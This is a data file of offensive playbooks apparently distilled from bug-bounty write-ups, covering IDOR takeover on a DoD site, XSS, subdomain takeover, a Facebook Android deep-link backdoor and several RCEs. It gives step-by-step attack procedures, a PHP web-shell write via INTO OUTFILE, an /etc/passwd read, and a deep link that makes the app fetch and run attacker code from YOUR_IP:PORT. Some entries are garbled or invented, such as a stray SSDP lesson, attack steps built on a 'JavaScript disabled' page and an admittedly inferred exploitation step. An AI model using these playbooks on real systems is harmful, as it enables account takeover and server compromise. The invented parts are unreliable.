playbooks.key_lesson: Always validate and sanitize data received from local network protocols (like SSDP) that could be used to construct Android Intents, as these can be triggered without user interaction.

meta.title: How i could take over any Account on a USA Department of Defense Website due to a simple IDOR

tech_stack_fingerprints: Custom signup page not requiring CAC card
POST request to /signIn/account containing a user ID parameter

trigger_conditions.when_to_apply: When an authenticated user can access their account settings, and the request to update account information includes a user ID parameter in the POST body.
prerequisites: Attacker must have an authenticated account on the target website.
applicability_signals: Account settings page accessible to authenticated users.
Burp Suite capture of POST request to /signIn/account reveals a 'userId' or similar parameter in the request body.
skip_if: Account information is exclusively fetched from session cookies.
No user ID parameter is sent in the POST request for account updates.
Server-side validation prevents the modification of another user's ID.

recon_steps: Step 1: Perform Google Dorking for login and signup pages on the target DoD domain.
Step 2: Identify and interact with any non-standard signup pages that don't require typical DoD authentication (e.g., CAC card).
attack_steps: Step 1: Register for an account on the identified signup page.
Step 2: Navigate to the account settings page after logging in.
Step 3: Capture the HTTP request using Burp Suite when clicking the 'Update' button in the account settings.
Step 4: Identify the POST request to the account settings endpoint (e.g., /signIn/account).
Step 5: Observe the request body for a parameter containing the current user's ID (e.g., userId).
Step 6: Register for a second, separate account on the same website to obtain a different user ID.
Step 7: Log out of the original account.
Step 8: Re-send the captured POST request from Step 3 using the original account's session, but modify the user ID parameter to the ID of the second account.
Step 9: Analyze the response to determine if the account information of the second user has been accessed or modified.
payloads_or_patterns:
POST /signIn/account HTTP/1.1
Host: <TARGET_URL>
Cookie: sessionid=<SESSION_TOKEN>

userId=<OTHER_USER_ID>&...
tools_recommended: Burp Suite: Intercepting proxy to capture and modify HTTP requests.
success_indicators: Response contains personal information (e.g., email, name) belonging to the other user.
Ability to successfully update or modify the account details of the other user.
failure_indicators: 403 Forbidden or 401 Unauthorized error.
Response indicates that the account settings could not be updated for the specified user.
Error message stating 'Cannot update account for another user'. Pivot: Try fuzzing other numeric identifiers in similar POST requests.

playbooks.impact: Full account takeover of any user on the U.S. Department of Defense website without requiring any user interaction or exploitation of the victim.
playbooks.key_lesson: Always examine POST request bodies for sensitive parameters like user IDs, especially when performing actions related to account management, and attempt to substitute values from other authenticated sessions.

meta.title: Facebook DOM Based XSS using postMessage

trigger_conditions.when_to_apply: When a web application or a Facebook Canvas App/Instant Game uses the Facebook JavaScript SDK and relies on `postMessage` for cross-window communication without proper origin validation.
prerequisites: The target application integrates with Facebook or uses the Facebook JavaScript SDK.
The application relies on `window.postMessage` for inter-window communication.
applicability_signals: Inspect JavaScript code for `window.postMessage` calls and message event listeners.
Look for scenarios where a parent window sends data to a child window or vice-versa using `postMessage`.
Analyze how the origin of incoming messages is validated.
skip_if: All `postMessage` listeners strictly validate the origin of the sender.
No user-controllable input is reflected in the `postMessage` payload or the target origin.

recon_steps: Step 1: Identify web pages or Facebook Canvas Apps/Instant Games that integrate with Facebook.
Step 2: Analyze the JavaScript code loaded by these applications, specifically looking for `window.postMessage` usage and event listeners for 'message'.
attack_steps: Step 1: Craft an HTML page that opens a Facebook Canvas App or Instant Game in a new window or iframe.
Step 2: Use `window.postMessage` to send a malicious payload to the opened Facebook window/iframe.
Step 3: Ensure the payload exploits the `postMessage` handler in the Facebook application which lacks proper origin validation or sanitization.
Step 4: If the Facebook application is vulnerable, the payload will be executed in the context of the Facebook domain.
tools_recommended: Browser Developer Tools: To inspect JavaScript, network requests, and console logs.
Burp Suite: To intercept and analyze HTTP requests and responses, and to host malicious HTML files.
success_indicators: An alert box displaying 'canvas.facebook.com' or 'apps.facebook.com' (or similar Facebook origin) pops up.
Arbitrary JavaScript code execution is confirmed within the context of a Facebook domain.
failure_indicators: No alert box appears, or the alert box shows a different domain than expected.
The `postMessage` call fails or is ignored due to origin restrictions.

playbooks.impact: Account takeover within Facebook or Canvas Apps/Instant Games, leading to unauthorized actions, data exfiltration, or further exploitation.
playbooks.key_lesson: Always strictly validate the origin of messages received via `window.postMessage` to prevent DOM-based XSS vulnerabilities in cross-window communication.

meta.title: 1000$ for Open redirect via unknown technique

affected_components: Web IDE (specifically the iframe preview feature)

trigger_conditions.when_to_apply: When a web application allows the execution of JavaScript within an iframe, and that iframe does not have the 'allow-top-navigation' sandbox directive. This is common in preview features or sandboxed user-generated content.
prerequisites: The ability to inject or control content within an iframe.
The target application must have a feature that previews code or content in an iframe.
applicability_signals: The target application offers a code preview or sandbox environment for user-generated content.
The preview feature uses an iframe.
The iframe's `sandbox` attribute is missing or does not include `allow-top-navigation`.
skip_if: The iframe sandbox attribute explicitly includes 'allow-top-navigation'.
The iframe's `src` attribute is fixed and cannot be influenced by the attacker.

recon_steps: Step 1: Identify features within GitLab (or any target) that allow code execution or previewing of user-generated content in an iframe.
Step 2: Inspect the HTML source of the preview iframe to check for the presence and configuration of the `sandbox` attribute.
attack_steps: Step 1: In the GitLab Web IDE, write JavaScript code that attempts to manipulate the top-level window location.
Step 2: Create an iframe that hosts user-provided HTML/JavaScript, ensuring the `sandbox` attribute is either absent or lacks `allow-top-navigation`.
Step 3: Within the JavaScript executed in the iframe, use `top.window.location = 'https://evil.com'` to attempt a redirect.
Step 4: Observe if the user's browser is redirected to the attacker-controlled domain when viewing the preview.
tools_recommended: Browser Developer Tools: To inspect iframe attributes and network requests.
Burp Suite: To intercept and modify requests/responses if dynamic content is involved.
success_indicators: The user's browser is redirected to the specified malicious URL (e.g., https://evil.com) after interacting with the vulnerable preview feature.
The target application's URL in the browser address bar changes to the attacker-controlled domain.
failure_indicators: No redirection occurs, and the iframe content remains isolated (e.g., error messages related to SOP, or the iframe content remains unchanged). This suggests the sandbox attributes are correctly configured or the `top.window.location` manipulation is blocked.
A 403 Forbidden or similar error is returned when attempting to set the location, indicating a WAF or browser-level protection.

playbooks.impact: Allows attackers to redirect authenticated users to malicious websites, facilitating phishing attacks, credential theft (if combined with other techniques), or the execution of further client-side exploits.
playbooks.key_lesson: When an application allows JavaScript execution within an iframe, always verify that the `sandbox` attribute is correctly configured with `allow-top-navigation` to prevent unauthorized top-level redirects.

meta.title: How I found a Tor vulnerability in Brave Browser, reported it, watched it get patched, got a CVE (CVE-2020-8276) and a small bounty, all in one working day

trigger_conditions.when_to_apply: When the target is Brave Browser and the user visits websites configured for Brave's referral partner program.
prerequisites: The target must be Brave Browser with the Tor feature enabled in Incognito mode.
The user must visit one of the domains listed in Brave's 'Local State' file under the 'referral' section.
applicability_signals: Presence of the 'Local State' file at ~/.config/BraveSoftware/Brave-Browser/Local State.
The 'Local State' file contains referral configurations with 'domains' and 'headers' (e.g., 'X-Brave-Partner').
skip_if: Target is not Brave Browser.
The 'Local State' file does not contain any referral configurations.

recon_steps: Step 1: Locate the Brave Browser configuration directory: `~/.config/BraveSoftware/Brave-Browser/`.
Step 2: Inspect the `Local State` file within the configuration directory to identify partner domains and associated referral headers.
attack_steps: Step 1: Navigate to a website listed in the `Local State` file's referral domains (e.g., coinbase.com) using Brave Browser's Incognito mode with Tor enabled.
Step 2: Observe the outgoing HTTP requests from Brave Browser using a network monitoring tool (e.g., Wireshark, browser developer tools).
Step 3: Confirm the presence of the injected referral header (e.g., `X-Brave-Partner: coinbase`) in the HTTP request sent to the partner domain.

Step 4: (Exploitation Step - Inferred from vulnerability type, not detailed in writeup) Attempt to leverage the injected header for unintended actions or information disclosure on the partner website.
tools_recommended: Browser developer tools (Network tab)
Wireshark
Burp Suite (for inspecting and potentially manipulating headers)
success_indicators: Observation of the injected referral header (e.g., 'X-Brave-Partner') in outgoing HTTP requests when visiting partner domains.
Confirmation that the Tor feature routes traffic and that the header is still injected.
failure_indicators: The referral header is not present in the outgoing requests.
Tor functionality is not enabled or not working correctly, preventing the test.
The target website does not show any unusual behavior despite the header injection (indicating the header itself might not be exploitable in this specific instance).

playbooks.impact: Information Disclosure: The injected referral header could potentially be used to track users across different sessions or to correlate their activity with specific partners, even within a privacy-focused Tor session. This bypasses the intended anonymity provided by Tor by adding a unique identifier linked to Brave's affiliate program.
playbooks.key_lesson: Always inspect local configuration files of privacy-focused applications for potential data leakage or unintended tracking mechanisms, especially when new features like Tor integration are introduced.

meta.title: Forcing for a bounty$$

tech_stack_fingerprints: Offers video previews of limited duration

trigger_conditions.when_to_apply: When a website allows authenticated users to preview paid content with a limited duration, and the preview mechanism is tied to a predictable resource identifier.
prerequisites: Attacker must have an authenticated user account on the target site.
applicability_signals: Endpoints related to video access contain a parameter that can be modified.
Video preview is significantly shorter than the full video duration.
skip_if: Resource identifiers for full content are not guessable or discoverable.
Preview duration is close to the full video duration.

recon_steps: Step 1: Authenticate to the target application and navigate to a video page that offers a preview.
Step 2: Use Burp Suite or a similar proxy to intercept requests related to video playback.
Step 3: Identify the endpoint responsible for serving video content and note any parameters related to video ID or preview access.
Step 4: Observe the subdomain used for video storage (if different from the main application).
attack_steps: Step 1: Send a request to the identified video endpoint for a video preview.
Step 2: Modify the request by removing or altering parameters suspected of controlling preview access (e.g., a parameter like `?preview=true` or a specific preview ID).
Step 3: Observe the response to determine if the full video content is served instead of the preview.
tools_recommended: Burp Suite: To intercept and modify HTTP requests.
Browser developer tools: To observe network requests and responses.
success_indicators: The HTTP response contains the full video content instead of a limited preview.
The video playback duration is no longer restricted.
failure_indicators: The response continues to serve only the preview content.
A 403 Forbidden or other access denied error is received after modification.
The video fails to load or stream. Pivot: Try different parameter manipulation techniques or look for other exposed resources on the video subdomain.

playbooks.impact: Attacker can access and download any paid educational video without purchasing it, leading to revenue loss for the organization.
playbooks.key_lesson: When preview features are implemented, always test by removing or manipulating parameters that might be controlling the preview restriction to check for full content access.

trigger_conditions.when_to_apply: When GitLab is configured to act as an OpenID Connect Identity Provider and an authenticated user has previously granted consent to an application, but has since revoked it.
prerequisites: GitLab configured as OIDC Identity Provider.
Authenticated user has previously granted consent to at least one OAuth/OIDC application.
The attacker has access to an intercepted token request code for a revoked application.
applicability_signals: GitLab's OIDC flow that includes a user consent step.
The presence of a 'Token Endpoint' at `/oauth/token`.
The ability to observe the user's 'Authorized applications' section.
skip_if: GitLab is not configured as an OIDC Identity Provider.
The target application does not use the OIDC/OAuth flow with GitLab.

recon_steps: Step 1: Identify GitLab instances configured as OIDC Identity Providers. Look for common GitLab deployment patterns and OIDC-related configurations.

Step 2: Verify if the target GitLab instance supports OIDC by initiating a login flow from a known Service Provider (e.g., Keycloak, a custom app) that uses GitLab for SSO. Observe the consent screen presented to the user.
attack_steps: Step 1: As an authenticated user, initiate an OIDC authentication flow from a Service Provider (SP) that uses GitLab as the Identity Provider (IdP). Intercept all requests using a proxy like Burp Suite.

Step 2: Forward requests until the 'Token Request' is made and a code is issued by GitLab. Save this 'Token Request' (including the code) for later use in Burp Repeater and disable interception temporarily.
Step 3: In GitLab's user settings, navigate to the 'Authorized applications' section and revoke consent for the application used in Step 1.

Step 4: Send the saved 'Token Request' from Step 2 to GitLab's Token Endpoint (`<TARGET_URL>/oauth/token`) using Burp Repeater. Use the exact same `code`, `grant_type`, and `redirect_uri` as originally issued.
Step 5: Observe the response from the Token Endpoint. If successful, fresh `access_token`, `id_token`, and `refresh_token` will be returned despite consent being revoked.
tools_recommended: Burp Suite (Proxy for interception, Repeater for sending crafted requests)
Browser developer tools for observing network requests and responses.
success_indicators: A `200 OK` response from the `/oauth/token` endpoint containing `access_token`, `id_token`, and `refresh_token` after consent has been revoked for the application associated with the `code`.
failure_indicators: A `400 Bad Request` or `401 Unauthorized` response from the `/oauth/token` endpoint indicating the code is invalid or expired. This might suggest that the specific GitLab version or configuration handles revocation more securely, or the code was indeed invalidated.
A `403 Forbidden` response might indicate an authorization issue on the token endpoint itself.

playbooks.impact: An attacker can obtain valid OAuth tokens (access, ID, and refresh tokens) for an application even after the user has explicitly revoked their consent. This allows the attacker to impersonate the user within the Service Provider, access sensitive user data that was previously authorized, and potentially perform actions on behalf of the user on the Service Provider, bypassing the intended consent revocation mechanism.
playbooks.key_lesson: When a user revokes consent for an OAuth/OIDC application, ensure that all associated authorization codes, access tokens, and refresh tokens are immediately invalidated by the Identity Provider. Do not allow previously issued but unredeemed codes to be used after revocation.

meta.title: Subdomain Takeover in Azure: making a PoC

trigger_conditions.when_to_apply: When a subdomain's DNS record (CNAME) points to an Azure service that has not been claimed by any user.
prerequisites: Attacker must be able to register a domain name that is no longer in use but still has DNS records pointing to an Azure service.
applicability_signals: Subdomain CNAME record pointing to a Microsoft Azure domain (e.g., *.cloudapp.net, *.azurewebsites.net)
DNS resolution of the subdomain returns NXDOMAIN or indicates the resource is unclaimed.
skip_if: The target subdomain's CNAME record points to an Azure service that is actively claimed by a user.

recon_steps: Step 1: Use `dig` or `nslookup` to query the DNS records for the target subdomain. Look for a CNAME record pointing to an Azure domain (e.g., `*.cloudapp.net`, `*.azurewebsites.net`).

Step 2: Analyze the `dig` output. If the CNAME points to an Azure domain and the response indicates the resource is unclaimed (e.g., NXDOMAIN at the top level), it's a potential candidate for subdomain takeover.
attack_steps: Step 1: Register the unclaimed domain name (e.g., `your-app-name.cloudapp.net` or `your-app-name.azurewebsites.net`) within the relevant Azure portal service.
Step 2: For Azure CloudApp, follow the instructions in the writeup to create a new Cloud Service instance in the Azure portal, using the unclaimed domain name.
Step 3: For Azure Websites, create a new Web App in the Azure portal, specifying a runtime stack (e.g., Python) and region, using the unclaimed domain name.
Step 4: Deploy a Proof of Concept (PoC) application to the newly registered Azure service. This typically involves creating a simple web application that displays a custom message or template.
Step 5: For CloudApp, create `.cspkg` and `.cscfg` files as described in the writeup and upload them to an Azure storage account, then deploy the app.
Step 6: For Azure Websites, link a GitHub repository containing the PoC application to the Deployment Center and configure continuous integration (CI) for deployment.
Step 7: After successful deployment, verify the PoC by visiting the vulnerable subdomain in a web browser.
payloads_or_patterns:
Custom HTML/text template for PoC (e.g., '

Subdomain Takeover PoC

Your custom message here

')
tools_recommended: dig or nslookup: For DNS record analysis.
Azure Portal: For registering domains and deploying services.
Visual Studio (optional): For creating CloudApp .cspkg and .cscfg files.
GitHub: For hosting PoC code for Azure Websites deployment.
success_indicators: Visiting the vulnerable subdomain in a web browser displays the attacker's custom PoC content instead of the default Azure page or an error.
`dig` output changes from NXDOMAIN to NOERROR and shows an IP address associated with the attacker's deployed service.
failure_indicators: The Azure portal rejects the domain registration because it is already claimed.
The deployed PoC does not render on the subdomain, or an Azure error page is displayed.
DNS records do not update or continue to show NXDOMAIN after attempting to claim the resource.

playbooks.impact: Attacker gains control of the subdomain, allowing them to host malicious content, phish users, or impersonate the legitimate owner of the subdomain.
playbooks.key_lesson: When a subdomain's CNAME record points to an Azure service and DNS resolution indicates the resource is unclaimed, attempt to register that Azure service using the unclaimed name to achieve a subdomain takeover.

meta.title: Leaked .git folder leads to RCE

trigger_conditions.when_to_apply: When a web application exposes a publicly accessible /.git/ directory, allowing for the retrieval of source code and configuration files.
prerequisites: Target web application must be running WordPress.
applicability_signals: Directory listing for /.git/ is accessible.
reNgine or similar tools detect git artifacts.
Existence of wp-config.php with database credentials.
skip_if: /.git/ directory returns 403 Forbidden or 404 Not Found.
No sensitive configuration files are found within the retrieved .git repository.

recon_steps: Step 1: Use a recon tool like reNgine to scan the target for common directories and files, specifically looking for /.git/.
Step 2: If /.git/ is found, attempt to browse its contents to confirm if it's a valid Git repository and not just a file with that name.
attack_steps: Step 1: Use a tool like GitHack or manually navigate the /.git/ directory to download the repository contents.
Step 2: Locate and analyze the wp-config.php file for database credentials (username, password, database name).
Step 3: Identify if Adminer or phpMyAdmin is installed on the server by attempting to access common paths like /adminer.php or /phpmyadmin/.
Step 4: If Adminer/phpMyAdmin is found and accessible, use the extracted database credentials to log in.
Step 5: Within the database management tool, locate the 'wp_users' table and examine its contents.

Step 6: Utilize the SQL command execution feature within Adminer/phpMyAdmin to execute commands that allow for local file access or command execution on the server. For example, using functions like `LOAD_FILE()` to read sensitive files or `SELECT ... INTO OUTFILE` to write files.

Step 7: Exploit a vulnerable plugin requiring authentication (if any found in the code) or upload arbitrary files (if file upload functionality is available) after gaining admin access through user table manipulation.
payloads_or_patterns: File: wp-config.php (search for DB_USER, DB_PASSWORD, DB_NAME)
SQL Command Example (file read): SELECT LOAD_FILE('/etc/passwd')
SQL Command Example (potential file write, requires specific privileges): SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'
tools_recommended: reNgine: For initial recon and .git directory detection.
GitHack: To automatically clone the Git repository.
Burp Suite: For intercepting and analyzing HTTP requests, and potentially for brute-forcing if needed.
Adminer/phpMyAdmin: For database access and SQL command execution.
success_indicators: Successful retrieval of source code and configuration files from the /.git/ repository.
Successful login to Adminer/phpMyAdmin using extracted credentials.
Successful execution of SQL commands to read local files (e.g., /etc/passwd) or write arbitrary files to the webroot.
Confirmation of RCE through a deployed backdoor or execution of system commands.
failure_indicators: /.git/ directory is inaccessible (403/404). → Try other recon techniques.
wp-config.php is missing or doesn't contain database credentials. → Focus on other vulnerabilities.
Database credentials are invalid or Adminer/phpMyAdmin is not installed. → Investigate other exploitation paths.
SQL command execution is blocked or does not lead to file access/command execution. → Explore WordPress plugin vulnerabilities or alternative RCE vectors.

playbooks.impact: Remote Code Execution (RCE) on the target server, allowing for complete compromise of the web application and potentially the underlying server. This includes data theft, unauthorized modification, and further network penetration.
playbooks.key_lesson: Always scan for and analyze publicly exposed .git directories, as they can often lead to the disclosure of sensitive configuration files and source code, enabling further exploitation like database access and RCE.

meta.title: Payload

affected_components: Login/Authentication flow when JavaScript is disabled

trigger_conditions.when_to_apply: When the target website, x.com, presents a message indicating JavaScript is disabled, and the user is prompted to enable it or switch to a supported browser.
prerequisites: Browser with JavaScript disabled or blocked.
applicability_signals: The explicit message: 'JavaScript is not available. We’ve detected that JavaScript is disabled in this browser. Please enable JavaScript or switch to a supported browser to continue using x.com.'
skip_if: The target website functions normally with JavaScript enabled.
The target website does not display the JavaScript disabled message.

recon_steps: Step 1: Access x.com in a browser with JavaScript explicitly disabled.
Step 2: Observe the page content for messages related to JavaScript, security, or functionality issues.
attack_steps: Step 1: Analyze the rendered HTML and any available HTTP headers when JavaScript is disabled.
Step 2: If an OAuth flow is initiated or accessible in this limited state, attempt to observe its parameters and redirection behavior.
Step 3: Identify any sensitive parameters or tokens that might be exposed or handled insecurely due to the lack of JavaScript execution.
tools_recommended: Burp Suite (for intercepting and analyzing HTTP requests/responses)
Browser developer tools (to inspect HTML and headers in a JavaScript-disabled state)
success_indicators: Exposure of sensitive OAuth parameters (client_id, redirect_uri, state, response_type) in the URL or response.
Unexpected redirection to an attacker-controlled domain during an OAuth flow.
Ability to bypass intended authorization checks by manipulating parameters sent without JavaScript.
failure_indicators: The page remains static with only the error message and no interactive elements or redirects. → Pivot to testing other features that do not strictly rely on JavaScript for basic functionality.
A generic error page is displayed without specific technical details. → Re-evaluate if the target has alternative endpoints or functionalities that could be exploited in a JS-disabled state.

playbooks.impact: Potential for unauthorized access to user accounts or sensitive data via manipulated OAuth flows if critical parameters are exposed or mishandled in a JavaScript-disabled state. This could lead to account takeover or data breaches.
playbooks.key_lesson: Always test critical authentication and authorization flows (like OAuth) in environments where JavaScript is disabled, as this can reveal vulnerabilities in how parameters are handled and validated server-side.

meta.title: How i got 7000$ in Bug-Bounty for my Critical Finding.

trigger_conditions.when_to_apply: When an Android application is available for analysis and sensitive information might be hardcoded within its static components.
prerequisites: Target provides an Android application package (APK) file.
applicability_signals: Existence of an APK file for the target application.
skip_if: No APK file is available or the application is purely cloud-based with no client-side components to analyze.

recon_steps: Step 1: Download the target APK file.
Step 2: Use Dex2jar tool to convert the APK file into a JAR file.
Step 3: Open the JAR file using JD-Gui or a similar decompiler.
attack_steps: Step 1: Within JD-Gui, navigate to the `com/target/global/Constants.java` file.
Step 2: Examine the contents of `Constants.java` for hardcoded URLs, API keys, or other sensitive configuration information.
Step 3: If an admin URL is found, attempt to access it.
Step 4: If default credentials ('admin':'admin') are suggested by the writeup, attempt to log in to the admin panel.
Step 5: Once authenticated into the admin panel, use a directory busting tool (e.g., Dirbuster) to discover hidden files and directories.
Step 6: Inspect discovered files, particularly those with extensions like .xls or .xlsx, for sensitive data such as PII and banking details.
tools_recommended: Dex2jar
JD-Gui
Dirbuster
success_indicators: Discovery of an admin URL within Constants.java.
Successful authentication to the admin panel using default credentials.
Enumeration of files containing sensitive information (e.g., Excel files with PII, banking details, API keys).
failure_indicators: Constants.java does not contain relevant sensitive information.
Admin panel is inaccessible or requires non-default credentials.
Directory busting does not reveal any sensitive files.
Response to directory busting requests are 404 or other non-information-revealing codes.

playbooks.key_lesson: Perform static analysis on mobile application APKs to uncover hardcoded credentials, API endpoints, and sensitive configuration files that may be missed during dynamic testing.

meta.title: Ability To Backdoor Facebook For Android

tech_stack_fingerprints: React Native framework usage (implied by DevServerHelper.java)

trigger_conditions.when_to_apply: When an application utilizes custom deep links that accept arbitrary host/IP addresses and do not sufficiently validate the input, especially if it leads to the loading and execution of external code bundles.
prerequisites: Attacker can control a web server accessible to the target device.
Target device has Facebook for Android installed.
The specific vulnerable deep link `fb://rnquantum_notification_handler/?address=` is present and active in the target app version.
applicability_signals: Presence of the `fb://rnquantum_notification_handler/?address=` deep link.
Observing that the `address` parameter in the deep link can accept IP addresses or hostnames.
Analysis of React Native source code revealing `DevServerHelper.java` and its interaction with bundled JS modules.
skip_if: The `address` parameter is strictly validated to only accept trusted internal hostnames.
The application performs thorough validation of the downloaded code bundle before execution.
A Web Application Firewall (WAF) blocks outgoing connections from the app to arbitrary IP addresses.

recon_steps: Step 1: Decompile the target Android APK file (`FB4A`) using tools like `apktool`. Search for custom URL schemes and their associated handlers.
Step 2: Use a script like `FBLinkBuilder` (provided in the writeup) to systematically extract all deeplinks from the APK.
Step 3: Compare deeplinks across different versions of the APK to identify newly introduced or modified deeplink handlers.

Step 4: Analyze the source code (or decompiled code) for identified deeplinks to understand their parameters and intended functionality, paying attention to parameters that accept network addresses (host/IP).
attack_steps: Step 1: Identify the vulnerable deep link: `fb://rnquantum_notification_handler/?address=`.
Step 2: Set up a local web server on an IP address and port (e.g., `192.168.0.2:8224`).

Step 3: Construct and trigger the deep link on the target device, setting the `address` parameter to the attacker's web server IP and port: `fb://rnquantum_notification_handler/?address=YOUR_IP:PORT`.

Step 4: Observe the incoming requests on the attacker's web server. The first request will likely be a `message` request with device information, followed by a `status` request expecting `packager-status:running`.
Step 5: Respond to the `status` request with `packager-status:running`.
Step 6: The application will then request a JavaScript bundle, e.g., `RKJSModules/EntryPoints/Fb4aBundle.bundle?platform=android&dev=true&minify=false`.

Step 7: Prepare a malicious JavaScript bundle (`Fb4aBundle.bundle`) that includes the necessary `__fbBatchedBridge` object and the `__fbBatchedBridge.callFunctionReturnFlushedQueue` function. This bundle should contain the custom malicious code (e.g., to capture typed input).
Step 8: Serve the malicious `Fb4aBundle.bundle` from the attacker's web server at the requested path.
Step 9: The Facebook app will download and execute the malicious bundle, allowing the attacker's custom code to run within the app's context.
tools_recommended: apktool: For decompiling Android APKs.
Python HTTP server: For serving the malicious bundle and responding to requests.
Burp Suite or similar proxy: To inspect network traffic and understand expected requests/responses.
FBLinkBuilder (custom script): To automate deeplink extraction.
HBCdump: Potentially useful for analyzing Hermes bytecode, though the exploit focused on the plain text bundle.
success_indicators: Observing the malicious JavaScript bundle (`Fb4aBundle.bundle`) being downloaded by the Facebook app from the attacker's server.
Receiving network requests (e.g., HTTP GET to `/log?data=...`) on the attacker's web server containing captured data (e.g., first 5 characters typed in the app).
Seeing the Facebook app crash unexpectedly after the malicious code executes (as demonstrated in the PoC video).
failure_indicators: No requests are made to the attacker's web server after triggering the deep link: The deeplink might be handled differently, or the `address` parameter is not being processed as expected.
The app returns an error or crashes immediately upon triggering the deep link: Input validation is occurring, or the initial handshake is failing.

The app requests a different bundle or fails to request a bundle after receiving `packager-status:running`: The server response might be incorrect, or the application expects a different bundle format/name.
The malicious bundle is downloaded but no custom code execution is observed: The bundle structure is incorrect, missing required bridges, or the JavaScript execution environment has restrictions.

playbooks.impact: Allows an attacker to execute arbitrary code within the context of the Facebook for Android application on a victim's device. This could lead to sensitive data exfiltration (e.g., typed credentials, messages, cookies), manipulation of application behavior, or further exploitation.
playbooks.key_lesson: Deep links that accept network addresses as parameters must implement robust validation to prevent the loading and execution of untrusted code from external servers.

meta.title: Wormable remote code execution in Alien Swarm

tech_stack_fingerprints: Game is a Source Engine title
Game name: Alien Swarm: Reactive Drop

trigger_conditions.when_to_apply: When a game server for Alien Swarm: Reactive Drop is running and accepting client connections, and the file upload functionality is exposed.
prerequisites: Attacker can connect to a vulnerable Alien Swarm: Reactive Drop game server.
applicability_signals: Existence of the `CNetChan::SendFile` API or similar client-to-server file transfer mechanism.
Server-side checks for file extensions and path traversal are present but can be bypassed.
skip_if: Server-side file extension filtering is robust and cannot be bypassed.
Path traversal is strictly enforced.
The game version has been patched to prevent these specific bypasses.

recon_steps: Identify a running instance of Alien Swarm: Reactive Drop that accepts client connections.
Analyze network traffic during normal game operations, if possible, to understand file transfer protocols.
attack_steps: Craft a malicious file name that bypasses the server-side checks for path traversal and disallowed extensions. Example: `./././(...)/shell.dll.txt` (padded to max length with `./`)
Utilize the `CNetChan::SendFile` API (or equivalent) to send the crafted file to the server.
Leverage the observed truncation of the filename buffer (`Q_strncpy`) on the receiving end to expose the malicious extension (`.dll`).
If the server allows execution of uploaded files (e.g., scripts, configuration files that can be interpreted), execute arbitrary code.
If direct execution is not possible, attempt to overwrite critical game files or configuration that could lead to RCE.
payloads_or_patterns: Filename pattern: `./././(...)/shell.dll.txt` (where `(...)` is padding to reach the buffer limit)
Payload: A crafted file with a `.dll` extension (or other executable/script extension if bypassable) that contains malicious code.
tools_recommended: Custom client exploit tool to interact with `CNetChan::SendFile`.
Network analysis tools (e.g., Wireshark) for understanding traffic.
Disassembler/debugger (e.g., IDA Pro, Ghidra) for analyzing game binaries to understand `CNetChan::SendFile` and related functions.
success_indicators: Arbitrary code execution confirmed on the game server.
Malicious file successfully written to a sensitive location on the server.
Server exhibits unexpected behavior indicative of code execution (e.g., spawning processes, network callbacks).
failure_indicators: File upload is rejected with an error indicating a disallowed extension or path.
The filename is not truncated as expected, and the malicious extension remains part of the filename.
Server does not execute the uploaded file or show any signs of compromise.

playbooks.impact: Remote code execution on the game server, allowing an attacker to take full control of the server, potentially host malicious content, disrupt gameplay, or launch further attacks on the server or network.
playbooks.key_lesson: Always validate and sanitize user-supplied file paths and names rigorously on the server-side, especially considering buffer overflows, truncation vulnerabilities, and case-insensitivity of file systems. Be wary of APIs that allow file transfers between clients and servers.

meta.title: Link Previews: How a Simple Feature Can Have Privacy and Security Risks
meta.programs: Discord, Meta / Facebook, Google, LINE, LinkedIn, Slack, Twitter, Zoom
meta.authors: Talal Haj Bakry and Tommy Mysk

target_profile.technology: Chat Applications with Link Preview Feature
tech_stack_fingerprints: Observing link preview generation in chat applications

trigger_conditions.when_to_apply: When a chat application automatically generates link previews for URLs sent in messages.
prerequisites: The target application must have a link preview feature enabled by default or configurable by the user.
The attacker can send a URL to a user of the target application.
applicability_signals: Chat application displays a preview (title, description, image) for a sent URL.
The application does not offer an explicit option to disable link previews.
skip_if: The application explicitly does not generate link previews.
Link previews are only generated after user interaction (e.g., tapping the link).

recon_steps: Step 1: Identify chat applications that automatically generate link previews for sent URLs.
Step 2: Analyze the implementation approach of link preview generation (sender-side, receiver-side, or server-side).
attack_steps: Step 1: Send a URL to a user within the target chat application.
Step 2: Observe if the chat application automatically generates a link preview for the sent URL.
Step 3: If a link preview is generated, the application (or its associated server) is making a GET request to the provided URL.
Step 4: If the application makes a GET request, it will include the IP address of the client (or the server making the request) in the HTTP headers.
Step 5: If the application is vulnerable, the IP address might be logged or exposed in the response or in subsequent communications.
tools_recommended: Burp Suite / OWASP ZAP: To monitor outgoing HTTP requests from the application or its servers if possible.
Wireshark: To capture network traffic and identify IP addresses in requests.
success_indicators: The IP address of the sender's device or the application's server is revealed in the response or logs.
A callback is received on a listener controlled by the attacker when the link preview is generated (if the link points to a specific resource for listening).
failure_indicators: No link preview is generated for any URL.
Link preview is only generated upon user interaction.
The application uses a proxy or VPN that masks the original IP address, and no callback is received.

playbooks.impact: Exposure of the IP address of the user sending the message, which can reveal their approximate geographic location and be used for targeted attacks or deanonymization.
playbooks.key_lesson: Always analyze the network requests generated by link preview features; they often reveal the IP address of the client or server making the request, leading to information disclosure.

meta.title: IBM Datapower Exploit CVE-2020-5014

affected_components: Management WebGUI (Send a Test Message function)
tech_stack_fingerprints: Presence of IBM DataPower Gateway management WebGUI

trigger_conditions.when_to_apply: When an authenticated user can access the 'Send a Test Message' functionality within the IBM DataPower management WebGUI.
prerequisites: Authenticated session to the Datapower management WebGUI
applicability_signals: Access to the 'Send a Test Message' feature in the WebGUI
skip_if: No authenticated access to the WebGUI is possible.
The 'Send a Test Message' feature is disabled or inaccessible.

recon_steps: Step 1: Authenticate to the IBM DataPower management WebGUI.
Step 2: Navigate to and identify the 'Send a Test Message' function. Observe its parameters and behavior.
attack_steps: Step 1: Use the 'Send a Test Message' function to target Redis services listening on localhost (127.0.0.1) within the appliance. This step leverages the SSRF vulnerability to interact with internal services.
Step 2: Combine the SSRF with HTTP request smuggling to send commands to Redis. This requires understanding and manipulating HTTP request structures.
Step 3: Exploit a hardcoded password for Redis (if applicable and identified through further research or known vulnerabilities) to bypass authentication.
Step 4: Leverage a known Redis RCE vulnerability by sending crafted commands to achieve arbitrary code execution on the underlying Linux operating system of the DataPower appliance.
payloads_or_patterns: Payloads will involve crafted HTTP requests for smuggling and Redis commands designed to trigger the RCE vulnerability. Specific payloads depend on the exact Redis RCE exploit used.
tools_recommended: Burp Suite (for intercepting and modifying requests, testing HTTP smuggling)
Custom scripts (for automating Redis command sending and RCE exploitation)
